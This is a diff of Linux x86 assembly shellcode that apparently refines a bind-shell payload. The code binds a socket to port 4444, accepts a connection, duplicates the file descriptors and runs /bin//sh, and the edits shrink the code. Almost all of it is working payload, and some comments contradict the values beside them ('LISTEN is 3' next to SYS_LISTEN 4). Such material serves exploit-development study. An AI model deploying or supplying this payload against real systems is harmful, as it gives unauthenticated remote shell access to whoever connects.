@@ -42,8 +42,8 @@ mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
 mov bl, 0x2	; socket syscall function BIND is 2 | #define SYS_BIND 2
 xor edx, edx	; zeroing edx
 push edx	; edx onto the stack for host_addr INADDR_ANY = 0
-push 0x5c11; sin.port=4444 | hex equivalent is 0x115c => 0x5c11 Little Endian
-push ebx	; AF_INET value is 2
+push word 0x5c11; sin.port=4444 | hex equivalent is 0x115c => 0x5c11 Little Endian
+push bx		; AF_INET value is 2
 mov ecx, esp	; ecx points to args
 push 0x10	; sizeof host
 push ecx	; push address onto stack
@@ -54,7 +54,7 @@ int 0x80	; execute
 ;
 ;Creating a listener
 ;
-mov edi, eax	; sockfd moved into edi
+xor eax, eax	; zeroing eax
 mov al, 0x66	;
 mov bl, 0x4	; socket syscall function LISTEN is 3 | #define SYS_LISTEN 4
 xor edx, edx	; zeroing edx
@@ -67,10 +67,9 @@ int 0x80
 ;Accept connection
 ;
 
-mov edi, eax	;
 mov al,0x66	;
 mov bl,0x5	;
-push edx	;
+push edx	; edx is already 0
 push edx	;
 push edi	;
 mov ecx, esp	;
@@ -81,8 +80,7 @@ int 0x80	;
 ;
 
 xchg ebx, eax	; moved the client connection fd into edi
-xor ecx, ecx
-mov cl, 0x0	; set loop counter
+xor ecx, ecx	; ecx is zero acts as loop counter
 
 loop:
 	mov al, 0x3f	; dup2 value 63 | Hex eqivalent is 0x3f
@@ -97,7 +95,7 @@ loop:
 
 xor edx, edx	; edx is 0
 push edx	; push 0 onto stack null terminator
-mov eax, 0xb	; execve 11 | Hex is 0xb
+mov al, 0xb	; execve 11 | Hex is 0xb
 push 0x68732f2f	; 
 push 0x6e69622f	;
 mov ebx, esp	; ebx points to top of stack
